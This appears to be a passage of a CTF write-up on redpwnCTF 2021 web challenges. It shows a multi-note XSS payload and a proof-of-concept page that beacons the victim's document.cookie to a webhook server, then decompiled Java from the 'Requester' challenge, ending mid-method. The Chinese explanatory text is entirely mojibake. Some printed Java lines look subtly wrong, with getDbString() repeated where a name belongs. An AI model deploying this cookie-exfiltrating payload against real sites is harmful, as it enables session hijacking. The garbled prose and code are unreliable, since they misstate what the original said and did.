&lt;p>‰ªé/static/view.html‰∏≠Êàë‰ª¨ÂèØ‰ª•ÁúãÂà∞Ëøô‰∏™notes-appÁöÑÂâçÁ´ØÊ∏≤ÊüìÊâÄÂá≠ÂÄüÁöÑÊ®°ÊùøÈïøÂï•Ê†∑&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093357548.png" alt="image-20210806093357548">&lt;/p>
&lt;p>bodyÈÉ®ÂàÜË¢´ÂÆåÂÖ®ÁöÑ‰øùÊä§‰∫ÜÔºå‰ΩÜÊòØtagÊ≤°ÊúâËøáÊª§ Âè™ÊòØÈôêÂà∂‰∫Ü‰∏™Êï∞&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806093711969.png" alt="image-20210806093711969">&lt;/p>
&lt;p>Êàë‰ª¨Âà©Áî®ÁöÑÂ∞±ÊòØÊµèËßàÂô®Ëß£ÊûêhtmlÁöÑÈÉ®ÂàÜÔºåÂèØ‰ª•ËÆ©‰∏çÁõ∏ÂÖ≥ÁöÑÂá†‰∏™notesÊãºÊé•Âú®‰∏ÄËµ∑Ôºà‰∏æ‰∏™ÁÆÄÂçïÁöÑÊ†óÂ≠êÔºöÂú®‰∏Ä‰∏™noteÈáåÈù¢Áî®&lt;code>&amp;lt;p&amp;gt;&lt;/code> Âè¶‰∏Ä‰∏™ÈáåÈù¢Êîæ&lt;code>&amp;lt;/p&amp;gt;&lt;/code>Ôºå‰∏≠Èó¥ÁöÑÈÉ®ÂàÜ‰ºöË¢´ÊîæÂú®‰∏ÄËµ∑ÔºâËøôÈáåÈÄâÁî®ÁöÑÊòØ&lt;code>&amp;lt;style&amp;gt;&lt;/code>Ëøô‰∏™tagÔºåÂà©Áî®ÂÆÉonloadÁöÑÂ±ûÊÄß&lt;/p>
&lt;p>ËøòÊúâ‰∏Ä‰∏™ÂæÖËß£ÂÜ≥ÁöÑÈóÆÈ¢òÊòØ‰∏ä‰∏ã‰∏§‰∏™notes‰πãÈó¥‰ºöÊúâ&lt;code>&amp;lt;div class=&amp;quot;card&amp;quot;&amp;gt;&lt;/code>ÁöÑÂ≠òÂú®ÔºõËøô‰πüÊòØ‰∏çÁî®&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>ÂíåÂÆÉÁöÑonloadÂ±ûÊÄßÁöÑÂéüÂõ†ÔºåÂõ†‰∏∫ÊµèËßàÂô®ÊòØ‰∏çÂÖÅËÆ∏&lt;code>&amp;lt;iframe&amp;gt;&lt;/code>‰∏≠Â±ûÊÄßÊç¢Ë°åÁöÑ&lt;/p>
&lt;p>Êàë‰ª¨ÊúÄÁªàÁöÑpayload&lt;/p>
&lt;pre tabindex="0">&lt;code>body: anything
tag: &amp;lt;style a='
body: anything
tag: 'onload='`
body: `;eval(somecode)/*
tag: */'&amp;gt;
&lt;/code>&lt;/pre>&lt;p>ÁÑ∂ÂêéÊòØÂ∏∏ËßÑÁöÑxss&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-html" data-lang="html">&lt;span style="color:#75715e">&amp;lt;!DOCTYPE html&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">window&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">open&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;https://notes.mc.ax/view/&amp;lt;username&amp;gt;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;navigator.sendBeacon(&amp;#39;&amp;lt;webhook server&amp;gt;&amp;#39;, document.cookie)&amp;#34;&lt;/span>&lt;span style="color:#111">);&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">script&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">body&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;span style="color:#111">&amp;lt;/&lt;/span>&lt;span style="color:#f92672">html&lt;/span>&lt;span style="color:#111">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="webrequester">web/Requester&lt;/h2>
&lt;blockquote>
&lt;p>Java is the future. Strictly typed, extremeley secure, and the most modern frameworks all come together to make an unhackable service. - Nobody 2021&lt;/p>
&lt;p>&lt;a href="https://requester.mc.ax/">requester.mc.ax&lt;/a>&lt;/p>
&lt;p>Downloads - &lt;a href="https://static.redpwn.net/uploads/d92499fb296055bd3767e8d5c707605ca56a00517726fa281fa35dfda611fdee/requester-release.zip">requester-release.zip&lt;/a>&lt;/p>
&lt;/blockquote>
&lt;p>javaÂèØ‰ª•ËØ¥ÊòØÂÆåÂÖ®‰∏çÊáÇÔºåÊØîËµõÁöÑÊó∂ÂÄôÂ∞±ÁÆÄÂçïÁúã‰∫Ü‰∏ãÂ∞±Ê∫ú‰∫ÜÔºåÂèÇËÄÉ &lt;a href="https://fireshellsecurity.team/redpwnctf-requester-and-requester-strikes-back/">Ëß£Ê≥ï1 - _replicator&lt;/a> &lt;a href="https://cor.team/posts/redpwnCTF%202021%20-%20web%20challenges#requester">Ëß£Ê≥ï2 - _find&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210806100214553.png" alt="image-20210806100214553">&lt;/p>
&lt;p>‰∏Ä‰∏™ÁÆÄÂçïÁöÑjava-appÔºåÊ£ÄÊµãÁªôÂá∫ÁöÑapiÊòØÂê¶Ê≠£Â∏∏ Âπ∂‰∏îËøîÂõû‰∏Ä‰∏™json&lt;/p>
&lt;p>Áªô‰∫Üdocker&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210710160029981.png" alt="image-20210710160029981">&lt;/p>
&lt;p>ÂÖàÁî®jd-guiÊâìÂºÄjarÂåÖÁúãÁúãÊ∫êÁ†Å&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210716211333162.png" alt="image-20210716211333162">&lt;/p>
&lt;p>ÂÖàÁúãMain.class&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Main&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">Database&lt;/span> &lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">flag&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">static&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">main&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span>&lt;span style="color:#f92672">[]&lt;/span> &lt;span style="color:#111">args&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUser&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;adminPassword&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">flag&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;flag&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">javalinEnv&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getenv&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;javalinEnv&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">adminUser&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">db&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">();&lt;/span>
&lt;span style="color:#111">JavalinJte&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">configure&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">createTemplateEngine&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">javalinEnv&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">Javalin&lt;/span> &lt;span style="color:#111">app&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">Javalin&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">create&lt;/span>&lt;span style="color:#f92672">().&lt;/span>&lt;span style="color:#75af00">start&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">8080&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">ctx&lt;/span> &lt;span style="color:#f92672">-&amp;gt;&lt;/span> &lt;span style="color:#111">ctx&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">render&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;index.jte&amp;#34;&lt;/span>&lt;span style="color:#f92672">));&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/createUser&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">createUser&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">app&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">get&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;/testAPI&amp;#34;&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">Handlers&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#111">testAPI&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÂÅö‰∏Ä‰∫õÂàùÂßãÂåñÁöÑÂ∑•‰ΩúÔºåÂèñÂá∫adminÁöÑÁî®Êà∑ÂêçÂíåÂØÜÁ†Å‰ª•ÂèäflagÁöÑÂÄºÔºåÊñ∞Âª∫‰∏Ä‰∏™databaseÔºåÂàÜÂá∫3‰∏™Ë∑ØÁî±Ôºõ&lt;/p>
&lt;p>ÂÖàÁúãdatabase.classÔºàÂàÜÊûêÁöÑÊØîËæÉËØ¶ÁªÜ ‰πãÂâçÂÅöjavaÂæàÂ∞ë&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">final&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#75af00">Database&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminUsername&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">adminPassword&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#75af00">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#d88200">&amp;#34;http://&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminUsername&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#00a8c8">this&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">adminPassword&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;@couchdb:5984/&amp;#34;&lt;/span>&lt;span style="color:#f92672">;&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#00a8c8">boolean&lt;/span> &lt;span style="color:#75af00">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">matches&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;^[a-zA-Z0-9_]*$&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>Â≠òÂÇ®‰ªémain.classÈáåÊé•Êî∂Âà∞ÁöÑadminUsername&amp;amp;adminPasswordÔºõ&lt;code>getDbString()&lt;/code>ËøîÂõû‰∏Ä‰∏™ÂèØ‰ª•Áî®Êù•ËøûÊé•couchdbÊï∞ÊçÆÂ∫ìÁöÑurl&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">has&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">res&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">getBoolean&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;ok&amp;#34;&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Database creation failed&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">initializeDatabase&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_replicator&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Replicator already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;_users&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Users already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">try&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">createDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;log&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span> &lt;span style="color:#00a8c8">catch&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#111">Utils&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">logException&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">e&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#111">System&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">out&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">println&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Log already initialized&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#f92672">}&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>ÈÄöËøáÂêëÊûÑÈÄ†Â•ΩÁöÑurlÂèëÈÄÅhttpËØ∑Ê±ÇÊù•ÂàõÂª∫Êï∞ÊçÆÂ∫ìÔºåÊúâ‰∏â‰∏™ÈªòËÆ§ÁöÑÂ∫ìÔºö_replicator, _users, log&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4">&lt;code class="language-java" data-lang="java">&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">createUser&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">name&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal name&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#00a8c8">if&lt;/span> &lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">length&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">&amp;gt;&lt;/span> &lt;span style="color:#111">16&lt;/span> &lt;span style="color:#f92672">||&lt;/span> &lt;span style="color:#f92672">!&lt;/span>&lt;span style="color:#111">validateAlphanumeric&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">password&lt;/span>&lt;span style="color:#f92672">))&lt;/span>
&lt;span style="color:#00a8c8">throw&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#111">Exception&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;Illegal password&amp;#34;&lt;/span>&lt;span style="color:#f92672">);&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">JSONObject&lt;/span> &lt;span style="color:#111">res&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#111">HttpClient&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">putAPI&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">()&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#d88200">&amp;#34;_users/org.couchdb.user:&amp;#34;&lt;/span> &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#111">getDbString&lt;/span>&lt;span style="color:#f92672">(),&lt;/span> &lt;span style="color:#111">userObj&lt;/span>&lt;span style="color:#f92672">.&lt;/span>&lt;span style="color:#75af00">toString&lt;/span>&lt;span style="color:#f92672">());&lt;/span>
&lt;span style="color:#75715e">// ... boring java stuff
&lt;/span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#f92672">}&lt;/span>
&lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">void&lt;/span> &lt;span style="color:#75af00">addUserToDatabase&lt;/span>&lt;span style="color:#f92672">(&lt;/span>&lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">dbName&lt;/span>&lt;span style="color:#f92672">,&lt;/span> &lt;span style="color:#111">String&lt;/span> &lt;span style="color:#111">username&lt;/span>&lt;span style="color:#f92672">)&lt;/span> &lt;span style="color:#00a8c8">throws&lt;/span> &lt;span style="color:#111">Exception&lt;/span> &lt;span style="color:#f92672">{&lt;/span>
